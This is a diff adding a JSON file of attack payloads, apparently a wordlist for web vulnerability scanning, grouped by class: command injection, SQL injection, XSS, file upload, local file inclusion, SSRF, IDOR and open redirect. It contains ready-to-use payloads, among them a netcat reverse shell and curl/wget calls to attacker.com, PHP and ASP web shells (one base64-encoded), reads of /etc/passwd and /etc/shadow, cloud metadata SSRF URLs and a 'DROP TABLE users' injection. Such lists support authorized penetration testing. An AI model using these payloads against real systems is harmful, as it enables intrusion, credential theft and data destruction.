@@ -1,0 +1,139 @@
+{
+  "command_injection": [
+    "; id",
+    "&& id",
+    "| id",
+    "|| id",
+    "`id`",
+    "$(id)",
+    "; whoami",
+    "; cat /etc/passwd",
+    "; ls -la",
+    "; sleep 5",
+    "| sleep 5",
+    "&& sleep 5",
+    "; curl http://attacker.com/",
+    "; wget http://attacker.com/",
+    "$(curl http://attacker.com/)",
+    "`curl http://attacker.com/`",
+    "; nc -e /bin/sh attacker.com 4444"
+  ],
+  "xss_reflected": [
+    "msgId=PAYLOAD",
+    "ss_country_filter=PAYLOAD",
+    "alert(1)",
+    "advanced_val=PAYLOAD",
+    "callback=PAYLOAD",
+    "from=PAYLOAD",
+    "color=PAYLOAD",
+    "index.php/svg/core/logo/logo=PAYLOAD",
+    "q=PAYLOAD",
+    "javascript:alert(1)",
+    "\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=PAYLOAD",
+    "__e2e_action_id=PAYLOAD",
+    "url=PAYLOAD"
+  ],
+  "web_application": [
+    "oseid=PAYLOAD"
+  ],
+  "business_logic": [
+    "order_id=PAYLOAD"
+  ],
+  "xss_dom": [
+    "returnUrl=PAYLOAD",
+    "alert(document.domain)"
+  ],
+  "sql_injection": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "'; DROP TABLE users--",
+    "' AND SLEEP(5)--",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "' OR '1'='1' /*",
+    "admin'--",
+    "admin' #",
+    "admin'/*",
+    "' UNION SELECT 1,2,3,4,5--",
+    "' UNION SELECT user(),version(),database()--",
+    "1' OR 1=1 LIMIT 1 -- -+",
+    "1') OR 1=1 LIMIT 1 -- -+",
+    "1')) OR 1=1 LIMIT 1 -- -+"
+  ],
+  "xss": [
+    "<script>alert(document.domain)</script>",
+    "<img src=x onerror=alert(document.domain)>",
+    "<svg onload=alert(document.domain)>",
+    "javascript:alert(document.domain)",
+    "\"><script>alert(document.domain)</script>",
+    "</script><script>alert(document.domain)</script>",
+    "<iframe src=\"javascript:alert(document.domain)\">",
+    "<body onload=alert(document.domain)>",
+    "<input onfocus=alert(document.domain) autofocus>",
+    "<select onfocus=alert(document.domain) autofocus>",
+    "<details open ontoggle=alert(document.domain)>",
+    "<marquee onstart=alert(document.domain)>",
+    "<<SCRIPT>alert(document.domain)//<</SCRIPT>",
+    "<IMG SRC=/ onerror=\"alert(document.domain)\"></img>",
+    "<svg/onload=alert(document.domain)>"
+  ],
+  "file_upload": [
+    "shell.php",
+    "shell.php.png",
+    "shell.phtml",
+    "shell.php5",
+    "shell.php3",
+    "shell.jsp",
+    "shell.asp",
+    "shell.aspx",
+    "webshell.php",
+    "cmd.php",
+    "<?php system($_GET[\"c\"]); ?>",
+    "<?php exec($_POST[\"cmd\"]); ?>",
+    "<%eval request(\"cmd\")%>"
+  ],
+  "lfi": [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "/etc/passwd",
+    "/etc/shadow",
+    "/proc/self/environ",
+    "/var/log/apache/access.log",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://input",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
+    "/proc/version",
+    "/etc/hostname",
+    "/proc/self/cmdline"
+  ],
+  "ssrf": [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://localhost:8080",
+    "http://127.0.0.1:22",
+    "file:///etc/passwd",
+    "gopher://127.0.0.1:6379/_INFO",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://169.254.169.254/metadata/v1/maintenance",
+    "http://[::]:80/",
+    "http://0000::1:80/",
+    "http://[::]:22/"
+  ],
+  "idor": [
+    "user_id=1",
+    "id=1337",
+    "account_id=123",
+    "order_id=456",
+    "file_id=789",
+    "document_id=999"
+  ],
+  "open_redirect": [
+    "//evil.com",
+    "http://evil.com",
+    "\\evil.com",
+    "/\\evil.com",
+    "//evil.com@good.com",
+    "javascript:alert(1)"
+  ]
+}
